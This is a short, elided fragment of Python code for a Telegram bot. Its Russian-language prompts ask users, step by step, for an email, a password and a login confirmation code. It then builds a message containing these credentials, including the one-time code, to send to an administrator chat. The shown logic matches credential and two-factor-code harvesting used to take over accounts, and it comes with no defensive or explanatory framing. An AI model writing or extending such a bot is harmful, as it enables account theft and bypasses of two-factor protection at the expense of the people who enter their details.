...
async def receive_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the three credential steps: email, password, confirmation code."""
    user_id = update.effective_user.id
    ...
    if context.user_data.get("waiting_for_password"):
        ...
        await update.message.reply_text(
            "🔐 *Шаг 3 из 3*\n\nОтправь код подтверждения входа (только цифры).",
            parse_mode="Markdown",
        )
        return
    ...
    if ADMIN_CHAT_ID:
        try:
            ...
            credentials_text = (
                ...
                f"📲 Код подтверждения: `{order['login_code']}`\n\n"
